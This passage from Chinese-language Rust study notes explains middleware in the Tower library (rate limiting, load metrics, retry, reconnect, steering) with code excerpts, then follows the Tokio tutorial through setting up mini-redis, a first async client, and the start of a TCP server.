<p>AsyncResponseFuture 的 poll 结果由当前 state 决定。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl&lt;P, S, Request&gt; Future for AsyncResponseFuture&lt;P, S, Request&gt;
where
    P: AsyncPredicate&lt;Request&gt;,
    S: Service&lt;P::Request&gt;,
    S::Error: Into&lt;crate::BoxError&gt;,
{
    type Output = Result&lt;S::Response, crate::BoxError&gt;;
​
    fn poll(self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt;) -&gt; Poll&lt;Self::Output&gt; {
        let mut this = self.project();
​
        loop {
            match this.state.as_mut().project() {
                StateProj::Check { mut check } =&gt; {
                    let request = ready!(check.as_mut().poll(cx))?;
                    let response = this.service.call(request);
                    this.state.set(State::WaitResponse { response });
                }
                StateProj::WaitResponse { response } =&gt; {
                    return response.poll(cx).map_err(Into::into);
                }
            }
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="limit-中间件"><a class="header" href="#limit-中间件">Limit 中间件</a></h3>
<p>服务器的处理能力是有限的，如果短时间内到达的 request 过多，可能会导致系统宕机。Limit 中间件用于对 request 进行限制，主要分为两种方式：</p>
<ul>
<li>concurrency: 限制并发处理的 request 数量</li>
<li>rate：限制 request 处理的速率</li>
</ul>
<p>concurrency 很好实现，只需要在 Service 维护一个信号量 semaphore，每要处理一个 request 就获取一个信号量，使得并发处理的数量不会超过信号量的值。</p>
<p>rate 可以表示为每一段时间允许的 request 数量：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct Rate {
  num: u64,
  per: Duration
}
<span class="boring">}
</span></code></pre></pre>
<p>借助 tokio::time::sleep_util future，限制 now 到 now+per 这段时间内的 request 处理数量。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl&lt;S, Request&gt; Service&lt;Request&gt; for RateLimit&lt;S&gt;
where
  S: Service&lt;Request&gt;
{
  type Response = S::Response;
  type Error = S::Error;
  type Future = S::Future;
  fn call(&amp;mut self, request: Request) -&gt; Self::Future {
    match self.state {
      State::Ready{mut until, mut rem} =&gt; {
        let now = Instant::now();
        if now &gt;= until {
          until = now + self.rate.per();
          rem = self.rate.num();
        }

        if rem &gt; 1 {
          rem -= 1;
          self.state = State::Ready{until, rem};
        } else {
          self.sleep.as_mut().reset(until);
          self.state = State::Limited;
        }

        self.inner.call(request);
      }
      State::Limited =&gt; panic!(&quot;service not ready&quot;)
    }
  }
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="load-中间件"><a class="header" href="#load-中间件">Load 中间件</a></h3>
<p>Load 是用于定量化表示一个 Service 的负载的中间件。调用 Balance layer 的 Service 集就要求 Service 必须实现 Load trait。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>trait Load {
  type Metric: PartialOrd,
  fn load(&amp;self) -&gt; Self::Metric;
}
<span class="boring">}
</span></code></pre></pre>
<p>Load 提供下列三个计算 Service 负载的模块：</p>
<ul>
<li>Constant：将 Service 的 Load 指标设为常数；</li>
<li>PendingRequests: 根据 Service 的 Pending request 的数量作为 Service 的负载指标；</li>
<li>PeakEwma: 峰值移动指数平均算法，将 request 的 rtt 时间作为 Service 的负载指标，rtt 即 request 从被接收到返回 response 中间经历的时间。<br />
同时 Load 维护一个平均 rtt 时间，如果最新 request 的 rtt 大于平均 rtt，则取最新 rtt 作为平均 rtt（这就是峰值移动指数平均法的意思）；如果 rtt 小于平均rtt，则根据最新 rtt 和移动指数平均算法计算平均rtt。</li>
</ul>
<p>第二、第三个模块显然需要追踪每个 request 的运行情况，为了解决这个问题，两个模块在实现 Service trait 的 call 函数时会返回一个 TrackCompletionFuture</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct TrackCompletionFuture&lt;F, C, H&gt; {
  #[pin]
  future: F,
  handle: Option&lt;H&gt;,
  completion: C
}
<span class="boring">}
</span></code></pre></pre>
<p>其中，handle 为通知 Service request 已经完成的柄，TrackCompletionFuture 只需要负责在 request 执行完成之后 drop handle，由具体的模块去实现 handle 被 drop 时需要实现的动作。</p>
<p>比如 PeakEwma 模块的 handle 需要追踪从接收 request 到执行完成的时间：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct Handle {
  sent_at: Instant,
  decay_ns: f64,
  rtt_estimate: Arc&lt;Mutex&lt;RttEstimate&gt;&gt;
}
impl Drop for Handle {
  fn drop(&amp;mut self) {
    let recv_at = Instant::now();
    if let Ok(mut rtt) = self.rtt_estimate.lock() {
      rtt.update(self.sent_at, recv_at, self.decay_ns);//涉及到PeakEwma算法的实现。
    }
  }
}
<span class="boring">}
</span></code></pre></pre>
<p>至于 PendingRequests 就更简单了，其 handle 直接就是一个 Arc&lt;()&gt; 类型的 wrap，直接调用 Arc 类型的 strong_count 函数就知道当前 Pending 的 request 数量。</p>
<h3 id="loadshed-中间件"><a class="header" href="#loadshed-中间件">LoadShed 中间件</a></h3>
<p>LoadShed 类似于 Rust 中的一些 try_xxx 函数，其 poll_ready 函数返回 <code>Poll&lt;Result&lt;(), E&gt;&gt;</code> 类型，当 poll_ready 被调用时，总是返回 Ready，但是根据里层的类型判断里层 Service 是否真的 Ready，这个中间件适用于一些特殊的场景。</p>
<p>如果在 Service not ready 的情况下调用call函数，则会返回 overloaded 错误。</p>
<h3 id="make-中间件"><a class="header" href="#make-中间件">Make 中间件</a></h3>
<p>Make 中间件是一种产生 Service 的 Service，适用于一些需要产生新的 Service 来进行处理的场景。Tower 给出的例子是 TCP listener，当收到一个新的 TCP 连接时，listener 需要创建一个新的 Service 来处理 TCP stream。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>trait MakeService&lt;Target, Request&gt;: Sealed&lt;(Target, Request)&gt; {
  type Response;
  type Error;
  type Service: Service&lt;Reuquest, Response = Self::Response, Error = Self::Error&gt;;
  type MakeError;
  type Future: Future&lt;Output = Result&lt;Self::Service, Self::MakeError&gt;&gt;;

  fn poll_ready(&amp;mut self, cx: &amp;mut Context&lt;'_&gt;) -&gt; Poll&lt;Result&lt;(), Self::MakeError&gt;&gt;;
  fn make_service(&amp;mut self, target: Target) -&gt; Self::Future;
}
<span class="boring">}
</span></code></pre></pre>
<p>MakeService 已经为所有 Response type 为 Service 类型的 Service 自动实现。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl&lt;M, S, Target, Request&gt; MakeService&lt;Target, Request&gt; for M
where
    M: Service&lt;Target, Response = S&gt;,
    S: Service&lt;Request&gt;,
{
    type Response = S::Response;
    type Error = S::Error;
    type Service = S;
    type MakeError = M::Error;
    type Future = M::Future;
​
    fn poll_ready(&amp;mut self, cx: &amp;mut Context&lt;'_&gt;) -&gt; Poll&lt;Result&lt;(), Self::MakeError&gt;&gt; {
        Service::poll_ready(self, cx)
    }
    fn make_service(&amp;mut self, target: Target) -&gt; Self::Future {
        Service::call(self, target)
    }
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="service_fn-组件"><a class="header" href="#service_fn-组件"><strong>service_fn 组件</strong></a></h3>
<p>Tower 提供了一个可以快速将一个签名为</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>async fn(req: Request) -&gt; Result&lt;Response, Box&lt;dyn std::error::Error + Send + Sync&gt;&gt;;
<span class="boring">}
</span></code></pre></pre>
<p>的异步函数包装为一个 Service 的函数 service_fn，其就是一个 Make Service。这种包装很简单，因为每个异步函数在调用时编译器会自动生成一个 Future。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct ServiceFn&lt;T&gt; {
  f: T
}
impl&lt;T, F, Request, R, E&gt; Service&lt;Request&gt; for ServiceFn&lt;T&gt;
where
    T: FnMut(Request) -&gt; F,
    F: Future&lt;Output = Result&lt;R, E&gt;&gt;,
{
    type Response = R;
    type Error = E;
    type Future = F;
​
    fn poll_ready(&amp;mut self, _: &amp;mut Context&lt;'_&gt;) -&gt; Poll&lt;Result&lt;(), E&gt;&gt; {
        Ok(()).into()
    }
    fn call(&amp;mut self, req: Request) -&gt; Self::Future {
        (self.f)(req)
    }
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="reconnect-中间件"><a class="header" href="#reconnect-中间件">Reconnect 中间件</a></h3>
<p>Reconnect 是一个可以在发生错误时自动重连的中间件，一个 Reconnect Service 有三种状态：</p>
<ul>
<li>Idle: 暂时没有任何服务连接，当在这个状态 poll_ready 时，需要根据内部的一个 MakeService 中间件创建一个 Service Future 并跳到 Connecting(MakeService::Future) 状态</li>
<li>Connecting: 通过前一步的 Service Future 进行 poll，如果返回 Ready 则跳到 Connected(Service) 状态，如果有错误则跳到 Idle 状态</li>
<li>Connected: 调用内层 Service 的 poll_ready，如果返回错误，则需要重新创建连接，跳到 Idle 状态</li>
</ul>
<p>在 poll_ready 函数中，遇到 Poll::Ready(Ok(<em>)) 或 Poll::Pending 则直接返回，如果遇到 Poll::Ready(Err(</em>)) 则不断循环，直到 Service 正常，因此为 Reconnect。从这一点来看，poll_ready 其实永远不会返回 Poll::Ready(Err(_))，但是为了后续的扩展性，在函数签名上还是有。</p>
<p>Reconnect 如果在非 Connected 状态下调用 call 函数则会 panic。</p>
<h3 id="retry-中间件"><a class="header" href="#retry-中间件">Retry 中间件</a></h3>
<p>Retry 中间件试图将多次里层 Service 的 poll 表现为一次，最简单的场景，对于一个比较繁忙的 Service，单次 poll 可能会返回 Error，于是我可能希望将 Service Future 的一次 poll 表现为里层 Service 每隔一段时间进行一次 poll 进行多次，直到成功返回 Ready 或达到次数限制。Retry 中间件就适用于这些场景。</p>
<p>显然上面只是一种最简单的场景，Tower 为了给予用户最大的 Retry 定制化空间，只需要用户决定是否继续 retry 的类型实现 Policy trait</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>trait Policy&lt;Req, Res, E&gt;: Sized {
  type Future: Future&lt;Output = Self&gt;;
  fn retry(&amp;self, req: &amp;Req, result: Result&lt;&amp;Res, &amp;E&gt;) -&gt; Option&lt;Self::Future&gt;;
  fn clone_request(&amp;self, req: &amp;Req) -&gt; Option&lt;Req&gt;;
}
<span class="boring">}
</span></code></pre></pre>
<p>其中 retry 函数用于决定是否应该继续 retry，如果返回 None 则停止，否则返回 Some(Future)。Future 可以在被 poll 时每次生成一个新的实现了 Policy 的 Retry Service，这意味着每次 retry 之后都可以产生新的 Service，而不是只能一直使用同一种 Policy，进一步增大了自由度。</p>
<p>最后再看 Tower 给的 Retry Service 对于 call 函数的 ResponseFuture 的实现。ResponseFuture 包含三种状态：</p>
<ul>
<li>Called(service_future): 可以poll一次里层 Service，如果是 Pending 则直接返回 Pending。否则调用 retry 函数生成一个新的 Retry Service Future，跳到 Checking(retry_future) 状态</li>
<li>Checking(retry_future): 等待 retry_future 生成新的 Retry Service 的中间态，如果生成 Retry Service 则跳到 Retrying 状态</li>
<li>Retrying: 等待里层 Service poll_ready 的中间态，如果里层 Service 已经 Ready，则调用里层 Service 的call函数生成 service_future 并跳到 Called(service_future) 状态</li>
</ul>
<h3 id="spawnready-中间件"><a class="header" href="#spawnready-中间件">SpawnReady 中间件</a></h3>
<p>SpawnReady 在官方文档上的介绍是 &quot;Drive a service to readiness on a background task&quot;。如果我们需要尽快察觉到某个 Service 已经 ready，那我们可能会经常去 poll_ready 一下，而 SpawnReady 就是将这件事包装为一个 Service，并且在内部包装一个 task 用于检查内层 Service 是否 ready。假设 executor 里面只有两个 task，那么一个是真正在做事的 task，另一个则是检查前一个 task 是否 ready 的 task。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl&lt;S, Req&gt; Service&lt;Req&gt; for SpawnReady&lt;S&gt;
where
    Req: 'static,
    S: Service&lt;Req&gt; + Send + 'static,
    S::Error: Into&lt;BoxError&gt;,
{
    type Response = S::Response;
    type Error = BoxError;
    type Future = ResponseFuture&lt;S::Future, S::Error&gt;;
​
    fn poll_ready(&amp;mut self, cx: &amp;mut Context&lt;'_&gt;) -&gt; Poll&lt;Result&lt;(), BoxError&gt;&gt; {
        loop {
            self.inner = match self.inner {
                Inner::Service(ref mut svc) =&gt; {
                    if let Poll::Ready(r) = svc.as_mut().expect(&quot;illegal state&quot;).poll_ready(cx) {
                        return Poll::Ready(r.map_err(Into::into));
                    }
                    let svc = svc.take().expect(&quot;illegal state&quot;);
                    let rx =   tokio::spawn(svc.ready_oneshot().map_err(Into::into).in_current_span());
                    Inner::Future(rx)
                }
                Inner::Future(ref mut fut) =&gt; {
                    let svc = ready!(Pin::new(fut).poll(cx))??;
                    Inner::Service(Some(svc))
                }
            }
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>通过 ready_oneshot 函数将 Service 包装为一个 ReadyOneshot task，然后通过 tokio::spawn 传入 executor</p>
<h3 id="steer-中间件"><a class="header" href="#steer-中间件">Steer 中间件</a></h3>
<p>Steer 中间件用于管理 Service 数组，根据自定义的规则将 request 导向特定的 Service。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>trait Picker&lt;S, Req&gt; {
  fn pick(&amp;mut self, r: &amp;Req, services: &amp;[S]) -&gt; usize;
}
<span class="boring">}
</span></code></pre></pre>
<p>由于 Steer 内部维护多个 Service，所以只有多个 Service 同时 ready， Steer 才会返回 Ready。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct Steer&lt;S, F, Req&gt; {
  router: F,
  services: Vec&lt;S&gt;,
  not_ready: VecDeque&lt;usize&gt;,
  _phantom: PhantomData&lt;Req&gt;
}
impl&lt;S, Req, F&gt; Service&lt;Req&gt; for Steer&lt;S, F, Req&gt;
where
    S: Service&lt;Req&gt;,
    F: Picker&lt;S, Req&gt;,
{
    type Response = S::Response;
    type Error = S::Error;
    type Future = S::Future;
​
    fn poll_ready(&amp;mut self, cx: &amp;mut Context&lt;'_&gt;) -&gt; Poll&lt;Result&lt;(), Self::Error&gt;&gt; {
        loop {
            // must wait for *all* services to be ready.
            // this will cause head-of-line blocking unless the underlying services are always ready.
            if self.not_ready.is_empty() {
                return Poll::Ready(Ok(()));
            } else {
                if self.services[self.not_ready[0]]
                    .poll_ready(cx)?
                    .is_pending()
                {
                    return Poll::Pending;
                }
​
                self.not_ready.pop_front();
            }
        }
    }
​
    fn call(&amp;mut self, req: Req) -&gt; Self::Future {
        assert!(
            self.not_ready.is_empty(),
            &quot;Steer must wait for all services to be ready. Did you forget to call poll_ready()?&quot;
        );
​
        let idx = self.router.pick(&amp;req, &amp;self.services[..]);
        let cl = &amp;mut self.services[idx];
        self.not_ready.push_back(idx);
        cl.call(req)
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>这样的处理实际会拖累整体的效率，如果某个 request 所需要的 Service 实际是 ready 的，但是可能为了等待其他的 Service 而延缓调用。但是为了兼容 Tower 的核心 API 不得不这么处理，毕竟 poll_ready 会与 request 相关的 Service 只有这一个。</p>
<h3 id="结论"><a class="header" href="#结论">结论</a></h3>
<p>Tower 将网络编程中常见的行为抽象为统一的 Service，对外的接口非常统一，并且可以相互叠加，而且是异步式，是一个扩展性非常强大的框架，值得学习一下。</p>
<h1 id="摘自httpszhuanlanzhihucomp548090197"><a class="header" href="#摘自httpszhuanlanzhihucomp548090197">摘自<a href="https://zhuanlan.zhihu.com/p/548090197">https://zhuanlan.zhihu.com/p/548090197</a></a></h1>
<div style="break-before: page; page-break-before: always;"></div><h2 id="介绍"><a class="header" href="#介绍">介绍</a></h2>
<p><a href="https://github.com/tokio-rs/mini-redis">mini-redis</a> 是一个不完整的使用 <a href="https://github.com/tokio-rs/tokio">tokio</a> 构建的 <a href="https://redis.io/">redis</a> client 和 server 。</p>
<p>是 tokio 团队提供的一个用于学习 <code>tokio</code> 的稍大的示例项目，接下来将以 <a href="https://github.com/tokio-rs/mini-redis">mini-redis</a> 作为我的第一个用来学习 <code>Rust</code> 的项目。</p>
<p>该项目的目的即是进行 <code>tokio</code> 教学(<a href="https://tokio.rs/tokio/tutorial">Tokio Tutorial</a>)，所以接下来就跟着 <a href="https://tokio.rs/tokio/tutorial">Tokio Tutorial</a> 走吧～</p>
<h2 id="开始"><a class="header" href="#开始">开始</a></h2>
<p><code>Tokio Tutorial</code> 将会带着我们逐步完成 <code>mini-redis</code> 的客户端和服务端。从使用 Rust 进行异步编程的基础知识开始，并从那里开始构建。我们将实现Redis命令的一个子集，但将全面了解Tokio。</p>
<h2 id="获得帮助"><a class="header" href="#获得帮助">获得帮助</a></h2>
<p> <code>tokio</code> 的 <a href="https://discord.gg/tokio">Discord</a> 和 <a href="https://github.com/tokio-rs/tokio/discussions">GitHub discussions</a> 是初学者获得帮助的好地方，在那里不用担心提一些“初学者才会提的问题”，大家都是从某个地方开始，很乐意帮忙。</p>
<h2 id="先决条件"><a class="header" href="#先决条件">先决条件</a></h2>
<p>在该教程中说明了教程需要读者已经熟悉了 <code>Rust</code> 编程语言，并且推荐了 <a href="https://doc.rust-lang.org/book/">Rust book</a>，当然 rust cn 社区有一本同样优秀的 <a href="https://course.rs">Rust course</a> 。</p>
<p>虽然不是必需的，但有使用Rust标准库或其他语言编写网络代码的一些经验可能会有所帮助。</p>
<h3 id="rust"><a class="header" href="#rust">Rust</a></h3>
<p>本教程至少需要Rust版本1.45.0，但建议使用Rust的最新稳定版本。</p>
<pre><code class="language-zsh">rustc --version
rustc 1.64.0 (a55dd71d5 2022-09-19)
</code></pre>
<h3 id="mini-redis-server"><a class="header" href="#mini-redis-server">Mini-Redis server</a></h3>
<p>接下来需要安装 <code>Mini-Redis server</code> 来保证我们写的客户端能被测试。</p>
<pre><code class="language-zsh">cargo install mini-redis
</code></pre>
<p>如果因为国内糟糕的网络环境导致下载速度不忍直视，可以使用字节跳动 Rust 技术团队的 <a href="https://rsproxy.cn/">rsproxy</a> 来替换默认源。</p>
<p>通过启动 server 来确保我们已经成功安装。</p>
<pre><code class="language-zsh">mini-redis-server
</code></pre>
<p>接着另外打开一个终端窗口，尝试使用<code>mini-redis-cli</code> <code>get</code> 一个 <code>key</code> 。</p>
<pre><code class="language-zsh">mini-redis-cli get foo
</code></pre>
<p>不出意外你会看到 <code>(nil)</code> 。</p>
<h2 id="准备开始"><a class="header" href="#准备开始">准备开始</a></h2>
<p>就是这样，一切准备就绪。转到下一页编写我们的第一个异步Rust应用程序。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="hello-tokio"><a class="header" href="#hello-tokio">Hello Tokio</a></h2>
<p>我们将从编写一个非常基本的 <code>Tokio</code> 应用程序开始。它将连接到 <code>Mini-Redis</code> 服务器，设置 <code>key</code> <code>hello</code> 的值为 <code>world</code> 。然后它将读回 <code>key</code>。这将使用 <code>Mini-Redis</code> 的客户端库完成。</p>
<h2 id="代码"><a class="header" href="#代码">代码</a></h2>
<hr />
<h3 id="生成一个新的-crate"><a class="header" href="#生成一个新的-crate">生成一个新的 <code>crate</code></a></h3>
<pre><code class="language-zsh">cargo new my-redis
cd my-redis
</code></pre>
<h3 id="添加依赖"><a class="header" href="#添加依赖">添加依赖</a></h3>
<p>接下来打开 <code>Cargo.toml</code> 并把下面的内容添加到 <code>[dependencies]</code> 下：</p>
<pre><code class="language-toml">tokio = { version = &quot;1&quot;, features = [&quot;full&quot;] }
mini-redis = &quot;0.4&quot;
</code></pre>
<h3 id="写代码"><a class="header" href="#写代码">写代码</a></h3>
<p>然后打开 <code>main.rs</code> 并将文件的内容替换成下面的：</p>
<pre><pre class="playground"><code class="language-rust">use mini_redis::{client, Result};

#[tokio::main]
async fn main() -&gt; Result&lt;()&gt; {
    // 向 mini-redis 的地址打开一个连接.
    let mut client = client::connect(&quot;127.0.0.1:6379&quot;).await?;

    // 设置一个叫 `hello` 的 key，它的内容是 `world`
    client.set(&quot;hello&quot;, &quot;world&quot;.into()).await?;

    // 去 get 这个 `hello`
    let result = client.get(&quot;hello&quot;).await?;

    println!(&quot;从服务端得到了值; result={:?}&quot;, result);

    Ok(())
}
</code></pre></pre>
<p>确保 <code>Mini-Redis server</code> 正在运行，找个单独的终端窗口执行:</p>
<pre><code class="language-zsh">mini-redis-server
</code></pre>
<p>现在，让我们运行我门的 <code>my-redis</code> 应用程序。</p>
<pre><code class="language-zsh">❯ cargo run         
    Finished dev [unoptimized + debuginfo] target(s) in 0.15s
     Running `target/debug/my-redis`
从服务端得到了值; result=Some(b&quot;world&quot;)
</code></pre>
<p>这样便是成功了，也算是即将要开始 coding 了！</p>
<h2 id="看看具体发生什么"><a class="header" href="#看看具体发生什么">看看具体发生什么</a></h2>
<p>让我们回顾一下刚刚做的事情，代码量不多，但是其实发生了很多事情。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let mut client = client::connect(&quot;127.0.0.1:6379&quot;).await?;
<span class="boring">}
</span></code></pre></pre>
<p><code>client::connect</code> 函数是由 <code>mini_redis</code> 这个 crate 提供的。它通过<strong>异步</strong>的方式向指定的地址建立一个 TCP 连接。一旦连接成功建立了，将会返回一个 <code>Client</code> handle(中文叫句柄)（这里给它起了个名 &quot;client&quot;）。</p>
<p>即使这个操作是<strong>异步</strong>执行的，但是我们写的这个代码看起来像是<strong>同步</strong>的。通过 <code>.await</code> 操作符来表明这是一个异步操作。</p>
<h3 id="何为异步编程"><a class="header" href="#何为异步编程">何为异步编程？</a></h3>
<p>相信看过 <code>The book</code> 或者 <code>Rust course</code> 的大伙都知道，下面就贴原文啦～</p>
<blockquote>
<p>Most computer programs are executed in the same order in which they are written. The first line executes, then the next, and so on. With synchronous programming, when a program encounters an operation that cannot be completed immediately, it will block until the operation completes. For example, establishing a TCP connection requires an exchange with a peer over the network, which can take a sizeable amount of time. During this time, the thread is blocked.</p>
<p>With asynchronous programming, operations that cannot complete immediately are suspended to the background. The thread is not blocked, and can continue running other things. Once the operation completes, the task is unsuspended and continues processing from where it left off. Our example from before only has one task, so nothing happens while it is suspended, but asynchronous programs typically have many such tasks.</p>
<p>Although asynchronous programming can result in faster applications, it often results in much more complicated programs. The programmer is required to track all the state necessary to resume work once the asynchronous operation completes. Historically, this is a tedious and error-prone task.</p>
</blockquote>
<p>当然还有机翻可供粗略观摩:</p>
<blockquote>
<p>大多数计算机程序都是按照它们编写的顺序执行的。第一行执行，然后是下一行，依此类推。使用同步编程，当程序遇到不能立即完成的操作时，它会阻塞，直到操作完成。例如，建立传输控制协议需要通过网络与对等方进行交换，这可能需要相当长的时间。在此期间，线程被阻塞。
对于异步编程，不能立即完成的操作会被挂起到后台。线程不会被阻塞，并且可以继续运行其他事情。一旦操作完成，任务就会被取消挂起，并从它停止的地方继续处理。我们之前的示例只有一个任务，所以挂起时什么都不会发生，但是异步程序通常有许多这样的任务。
虽然异步编程可以带来更快的应用程序，但它通常会导致更复杂的程序。一旦异步操作完成，程序员需要跟踪恢复工作所需的所有状态。从历史上看，这是一项乏味且容易出错的任务。</p>
</blockquote>
<h3 id="编译期的绿色线程compile-time-green-threading"><a class="header" href="#编译期的绿色线程compile-time-green-threading">编译期的绿色线程(Compile-time green-threading)</a></h3>
<blockquote>
<p><code>green-threading</code> 我的理解是一种非常轻量的“线程”，比如协程(<code>coroutine</code>)，以及直接被融入 <code>Go runtime</code> 的 <code>goroutine</code>（类似 coroutine，但又不同） 。</p>
</blockquote>
<p>Rust 通过叫作 <strong><code>async/await</code></strong> 的特征来实现异步编程。执行异步操作的函数用 <strong><code>async</code></strong> 关键字来标记。在我们的示例中，connect函数是这样定义的：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use mini_redis::Result;
use mini_redis::client::Client;
use tokio::net::ToSocketAddrs;

pub async fn connect&lt;T: ToSocketAddrs&gt;(addr: T) -&gt; Result&lt;Client&gt; {
    // ...
}
<span class="boring">}
</span></code></pre></pre>
<p><strong><code>async fn</code></strong> 这样的定义方式看起来像是一个常规的同步函数，但是以异步的方式运行。</p>
<p>Rust 在<strong>编译期将</strong> <strong><code>async fn</code></strong> 转化为一个异步运行的 <code>routine</code> （不是 <code>coroutine</code>，不要理解错误）。</p>
<p>在 <code>async fn</code> 中对 <code>.await</code> 的任何调用都会将控制权返回给线程（即让出当前线程），此时这个操作会被放在后台，而线程可能会去做一些别的事情。</p>
<blockquote>
<p>尽管也有其它语言实现了 <code>async/await</code> ，但 Rust 采用了一种独特的方法。</p>
<p>大多情况下，Rust 的异步操作表现为 <strong><code>lazy</code></strong>，这导致了不同于其它语言的运行时语义。</p>
</blockquote>
<p>如果还是不太明白，没有关系！我们将会在这整个教程中探索到更多关于 <strong><code>async/await</code></strong> 的知识。</p>
<h3 id="使用-asyncawait"><a class="header" href="#使用-asyncawait">使用 <code>async/await</code></a></h3>
<p><strong>异步函数</strong>的调用与任何其他Rust函数一样。但是，调用这些函数不会导致函数体执行。换而言之，调用<strong>异步函数</strong>会返回一个代表这个操作的值（在概念上类似于一个没有参数的闭包）。</p>
<p>如果要真正地去执行这个操作，需要对这个返回值使用 <code>.await</code> 操作符。</p>
<p>就像下面这样：</p>
<pre><pre class="playground"><code class="language-rust">async fn say_world() {
    println!(&quot;world&quot;);
}

#[tokio::main]
async fn main() {
    // 直接调用 `say_world()` 并不会执行它的函数体。
    let op = say_world();

    // 这个 println! 会先出现。
    println!(&quot;hello&quot;);

    // 对 `op` 调用 `.await`。
    op.await;
}
</code></pre></pre>
<p>输出会是下面这样的：</p>
<pre><code class="language-zsh">hello
world
</code></pre>
<p><code>async fn</code> 的返回值是实现 <code>Future</code> trait的匿名类型。</p>
<p><code>Future</code> 可以被看作是一个会在未来的某个时间点被执行的东西。</p>
<h3 id="异步的-main-函数"><a class="header" href="#异步的-main-函数">异步的 <code>main</code> 函数</a></h3>
<p><code>main</code> 函数与大多数的 Rust crate 不同，它被用来启动一个应用程序。</p>
<ol>
<li>
<p>它是一个 <strong><code>async fn</code></strong></p>
</li>
<li>
<p>它是用 <code>#[tokio::main]</code> 来注释的</p>
</li>
</ol>
<p>当我们想进入一个异步的上下文，会使用 <strong><code>async fn</code></strong>。然而，异步函数必须被一个 <strong><code>runtime</code></strong> 所执行（tokio 就是 Rust 社区大名鼎鼎的异步运行时）。<strong><code>runtime</code></strong> 包括异步任务调度器、提供事件 I/O、计时器等。<strong><code>runtime</code></strong> 不会自动启动，所以 <code>main</code> 函数需要去启动它。</p>
<p><code>#[tokio::main]</code> 是一个宏。它将 <code>async fn main()</code> 转化为一个同步<code>fn main()</code>，初始化了一个 <code>runtime</code> 实例并且执行了这个异步 main 函数。</p>
<p>例如以下内容：</p>
<pre><pre class="playground"><code class="language-rust">#[tokio::main]
async fn main() {
    println!(&quot;hello&quot;);
}
</code></pre></pre>
<p>被转化成：</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    let mut rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(async {
        println!(&quot;hello&quot;);
    })
}
</code></pre></pre>
<p><code>tokio runtime</code> 的细节将在后面介绍。</p>
<h3 id="cargo-features"><a class="header" href="#cargo-features">Cargo features</a></h3>
<p>在本教程引入 <code>tokio</code> 依赖时，<code>full</code> feature flag 被启用了。</p>
<pre><code class="language-toml">tokio = { version = &quot;1&quot;, features = [&quot;full&quot;] }
</code></pre>
<p><code>Tokio</code> 有很多功能（<code>TCP</code>、<code>UDP</code>、<code>Unix sockets</code>、<code>timer</code>、<code>sync utilities</code>、<code>multiple scheduler types</code> 等）。并非所有应用程序都需要所有功能(<code>full</code>)。当尝试优化编译时间或最终应用程序占用空间时，应用程序可以决定只选择它用到的那些功能。</p>
<p>目前，我们在依赖 <code>tokio</code> 时使用 <code>full</code> feature，来方便 code。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="spawning"><a class="header" href="#spawning">Spawning</a></h2>
<p>我们接下来准备开始完成我们的 Redis server！</p>
<p>首先，把上一部分的客户端的 <code>SET / GET</code> 代码移动到一个示例文件中去，这样我们可以在 server 上去运行它。</p>
<pre><code class="language-zsh">mkdir -p examples
mv src/main.rs examples/hello-redis.rs
</code></pre>
<p>创建一个新的空的 <code>src/main.rs</code> 后再继续。</p>
<h2 id="accepting-sockets从-sockets-接收"><a class="header" href="#accepting-sockets从-sockets-接收">Accepting sockets（从 sockets 接收）</a></h2>
<p>英语水平有限，这小标题只能翻译成这样了 :(</p>
<p>首先我们的 Redis server 第一件需要做的事情就是<strong>接受入站的 TCP sockets</strong>。用 <strong><code>tokio::net::TcpListener</code></strong> 来完成。</p>
<blockquote>
<p>Tokio 的许多类型用了与 Rust 标准库中的等价的同步类型一样的名字。并且 Tokio 使用 <code>async fn</code> 暴露了与 <strong><code>std</code></strong> 相同的 <code>APIs</code> </p>
</blockquote>
<p>一个 <code>TcpListener</code> 绑定在 <strong>6379</strong> 端口，接着 socket 们会在一个 loop 中被接受。每个 socket 都会被处理然后关闭。现在，为门将要读取命令，然后打印它到标准输出，并且回复一个 error。</p>
<pre><pre class="playground"><code class="language-rust">use mini_redis::{Connection, Frame};
use tokio::net::{TcpListener, TcpStream};

#[tokio::main]
async fn main() {
    // 绑定 listener 到一个地址
